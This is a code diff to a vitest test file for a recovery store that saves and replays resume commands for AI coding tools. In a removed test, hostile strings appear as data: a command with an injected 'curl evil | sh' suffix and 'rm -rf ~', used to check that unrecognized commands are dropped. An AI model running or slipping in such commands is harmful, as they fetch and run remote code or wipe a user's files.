@@ -2,7 +2,7 @@ import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import * as fs from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { createRecoveryStore, RECOVERY_CLOCK_SKEW_MS, RECOVERY_MAX_AGE_MS } from './recovery-store';
+import { createRecoveryStore, RECOVERY_MAX_AGE_MS } from './recovery-store';
 
 let dir: string;
 const messages: string[] = [];
@@ -10,10 +10,6 @@ const log = {
   info: (message: string) => messages.push(`info ${message}`),
   error: (message: string) => messages.push(`error ${message}`),
 };
-
-// Reads revalidate, so a claimed command must be a real resume invocation.
-const CLAUDE_A = 'claude --resume 0a1b2c3d-0000-4000-8000-00000000000a';
-const CODEX_B = 'codex resume 0a1b2c3d-0000-4000-8000-00000000000b';
 
 const file = () => join(dir, 'recovery.json');
 const read = () => JSON.parse(fs.readFileSync(file(), 'utf8')) as { createdAt: number; commands: Record<string, string> };
@@ -39,13 +35,13 @@ describe('recovery store', () => {
       // that captures nothing cannot carry it forward.
       expect(fs.existsSync(file())).toBe(false);
 
-      store.record('a', CLAUDE_A);
-      expect(read().commands).toEqual({ a: CLAUDE_A });
+      store.record('a', 'claude --resume A');
+      expect(read().commands).toEqual({ a: 'claude --resume A' });
 
       // A second capture in the same process (another window) merges.
       store.beginCapture();
-      store.record('b', CODEX_B);
-      expect(read().commands).toEqual({ a: CLAUDE_A, b: CODEX_B });
+      store.record('b', 'codex resume B');
+      expect(read().commands).toEqual({ a: 'claude --resume A', b: 'codex resume B' });
     });
 
     it('writes the record and its directory owner-only', () => {
@@ -88,17 +84,17 @@ describe('recovery store', () => {
 
   describe('take', () => {
     it('unlinks on the first call and hands out each id exactly once', () => {
-      write({ createdAt: Date.now(), commands: { a: CLAUDE_A, b: CODEX_B } });
+      write({ createdAt: Date.now(), commands: { a: 'claude --resume A', b: 'codex resume B' } });
       const store = createRecoveryStore(dir, { log });
 
-      expect(store.take(['a'])).toEqual({ a: CLAUDE_A });
+      expect(store.take(['a'])).toEqual({ a: 'claude --resume A' });
       // The durable copy is gone before anything can act on it, so a failed start
       // cannot replay it.
       expect(fs.existsSync(file())).toBe(false);
 
       // A second container claims its share of the same read; the first id is
       // spent.
-      expect(store.take(['a', 'b'])).toEqual({ b: CODEX_B });
+      expect(store.take(['a', 'b'])).toEqual({ b: 'codex resume B' });
       expect(store.take(['b'])).toEqual({});
     });
 
@@ -121,28 +117,20 @@ describe('recovery store', () => {
     });
 
     it('discards a record whose createdAt is not a number', () => {
-      // `Date.now() - '2026-10-07'` is NaN, which no bound comparison rejects.
+      // `Date.now() - '2026-10-07'` is NaN, which the age bound never rejects.
       write({ createdAt: '2026-10-07', commands: { a: 'claude --continue' } });
       const store = createRecoveryStore(dir, { log });
       expect(store.take(['a'])).toEqual({});
       expect(fs.existsSync(file())).toBe(false);
     });
 
-    it('discards a record dated in the future beyond clock skew, but not within it', () => {
-      write({ createdAt: Date.now() + RECOVERY_CLOCK_SKEW_MS + 60_000, commands: { a: 'claude --continue' } });
-      expect(createRecoveryStore(dir, { log }).take(['a'])).toEqual({});
-
-      write({ createdAt: Date.now() + 1_000, commands: { a: 'claude --continue' } });
-      expect(createRecoveryStore(dir, { log }).take(['a'])).toEqual({ a: 'claude --continue' });
-    });
-
-    it('drops an entry that is not a recognized resume invocation, and hands on the canonical form', () => {
-      write({
-        createdAt: Date.now(),
-        commands: { a: 'claude --continue; curl evil | sh', b: 'rm -rf ~', c: `  ${CODEX_B}  ` },
-      });
+    it('discards a record whose createdAt is not finite', () => {
+      // JSON has no Infinity literal, but an out-of-range number parses to one,
+      // whose age is -Infinity.
+      fs.writeFileSync(file(), '{"createdAt":1e999,"commands":{"a":"claude --continue"}}', 'utf8');
       const store = createRecoveryStore(dir, { log });
-      expect(store.take(['a', 'b', 'c'])).toEqual({ c: CODEX_B });
+      expect(store.take(['a'])).toEqual({});
+      expect(fs.existsSync(file())).toBe(false);
     });
 
     it('drops a non-string entry rather than handing it on', () => {
